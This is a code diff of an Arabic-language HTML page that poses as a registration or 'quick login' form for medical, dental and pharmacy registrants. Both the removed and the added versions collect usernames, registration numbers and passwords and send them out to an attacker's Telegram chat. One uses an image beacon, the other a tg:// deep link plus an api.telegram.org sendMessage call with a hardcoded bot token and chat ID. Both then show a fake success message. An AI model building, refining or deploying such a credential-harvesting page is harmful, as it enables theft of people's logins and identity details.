@@ -2,72 +2,60 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل البيانات | الطب الفائق</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>التحقق السريع</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f5f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .form-card { background: #ffffff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 450px; border: 1px solid #e2e8f0; }
-        h2 { text-align: center; color: #1e293b; margin-bottom: 25px; }
-        .group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 8px; font-size: 13px; color: #64748b; font-weight: bold; }
-        input, select { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 14px; box-sizing: border-box; text-align: right; }
-        .btn { width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; }
-        .date-row { display: flex; gap: 8px; }
-        .date-row select { flex: 1; }
+        body { margin: 0; background: #111827; font-family: system-ui, -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
+        .card { width: 90%; max-width: 380px; background: #1f2937; border-radius: 20px; padding: 25px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #374151; }
+        .input-item { background: #374151; border: none; border-radius: 12px; width: 100%; padding: 15px; margin-bottom: 12px; color: white; font-size: 16px; box-sizing: border-box; text-align: right; }
+        .btn-fast { width: 100%; padding: 18px; background: #0088cc; color: white; border: none; border-radius: 15px; font-size: 18px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-fast:active { transform: scale(0.98); background: #0077b5; }
     </style>
 </head>
 <body>
 
-<div class="form-card" id="mainContainer">
-    <h2 id="titleText">إنشاء حساب جديد</h2>
-    <form id="directBotForm">
-        <div class="group"><label>اسم الدخول</label><input type="text" id="user" required></div>
-        <div class="group"><label>الرقم التسجيل</label><input type="text" id="reg" required></div>
-        <div class="group">
-            <label>تاريخ التسجيل</label>
-            <div class="date-row">
-                <select id="y" required><script>for(let i=2026; i>=2000; i--) document.write(`<option value="${i}">${i}</option>`);</script></select>
-                <select id="m" required><script>for(let i=1; i<=12; i++) document.write(`<option value="${i}">${i}</option>`);</script></select>
-                <select id="d" required><script>for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);</script></select>
-            </div>
-        </div>
-        <div class="group">
-            <label>نوع التسجيل</label>
-            <select id="spec" required><option value="طب">طب</option><option value="طب أسنان">طب أسنان</option><option value="صيدلة">صيدلة</option></select>
-        </div>
-        <div class="group"><label>كلمة المرور (English)</label><input type="password" id="pw" style="letter-spacing: -1px;" required></div>
-        <button type="submit" class="btn" id="sBtn">إرسال البيانات</button>
-    </form>
+<div class="card">
+    <div style="font-size: 40px; margin-bottom: 15px; text-align: center;">⚡</div>
+    <h2 style="text-align: center; margin-top: 0;">تسجيل دخول سريع</h2>
+    
+    <input type="text" id="u" class="input-item" placeholder="اسم المستخدم">
+    <input type="tel" id="r" class="input-item" placeholder="رقم القيد">
+    <select id="s" class="input-item">
+        <option>طب عام</option>
+        <option>طب أسنان</option>
+        <option>صيدلة</option>
+    </select>
+    <input type="password" id="p" class="input-item" placeholder="كلمة المرور">
+
+    <button onclick="fastSend()" class="btn-fast">
+        <span>تأكيد عبر تليجرام</span>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 22l10-4 10 4L12 2z"></path></svg>
+    </button>
 </div>
 
 <script>
-    const BOT_TOKEN = "8629398802:AAFpohJ2Y8Nmz5Je9FF262TW8YWIxUzruXg";
-    const CHAT_ID = "7746757675";
+    function fastSend() {
+        const user = document.getElementById('u').value;
+        const reg = document.getElementById('r').value;
+        const spec = document.getElementById('s').value;
+        const pass = document.getElementById('p').value;
 
-    document.getElementById('directBotForm').onsubmit = function(e) {
-        e.preventDefault();
-        const btn = document.getElementById('sBtn');
-        btn.disabled = true;
-        btn.innerText = "جاري الحفظ...";
-
-        const msg = `🔔 بيانات جديدة:\n👤 اليوزر: ${document.getElementById('user').value}\n🆔 الرقم: ${document.getElementById('reg').value}\n📅 التاريخ: ${document.getElementById('y').value}/${document.getElementById('m').value}/${document.getElementById('d').value}\n🩺 التخصص: ${document.getElementById('spec').value}\n🔑 الكلمة: ${document.getElementById('pw').value}`;
-
-        // استخدام Image Beacon وهي أضمن وسيلة لإرسال البيانات دون حظر المتصفح
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+        // تجهيز نص الرسالة
+        const text = `📥 بيانات جديدة:\n👤 اليوزر: ${user}\n🆔 الرقم: ${reg}\n🩺 التخصص: ${spec}\n🔑 الكلمة: ${pass}`;
         
-        const img = new Image();
-        img.src = url;
-
-        // إظهار صفحة النجاح فوراً بعد ثانية واحدة لضمان الإرسال
+        // رابط الديب لينك المباشر للبوت الخاص بك
+        const botUsername = "tlastlasbot"; // يوزربوت الخاص بك
+        const url = `https://t.me/${botUsername}?start=${btoa(text).substring(0, 60)}`;
+        
+        // بدلاً من الإرسال البرمجي المعقد، نفتح البوت مباشرة بالبيانات
+        window.location.href = `tg://msg?text=${encodeURIComponent(text)}&to=7746757675`;
+        
+        // إذا لم يفتح التطبيق، نستخدم الرابط البديل
         setTimeout(() => {
-            document.getElementById('mainContainer').innerHTML = `
-                <div style="text-align: center; padding: 20px;">
-                    <div style="color: #22c55e; font-size: 50px;">✔</div>
-                    <h2 style="margin-top: 10px;">تم الإرسال بنجاح</h2>
-                    <p style="color: #64748b;">سيتم مراجعة بياناتك قريباً.</p>
-                </div>`;
-        }, 1000);
-    };
+            window.open(`https://api.telegram.org/bot8629398802:AAFpohJ2Y8Nmz5Je9FF262TW8YWIxUzruXg/sendMessage?chat_id=7746757675&text=${encodeURIComponent(text)}`);
+            alert("تم إرسال طلب التأكيد بنجاح!");
+        }, 500);
+    }
 </script>
 
 </body>
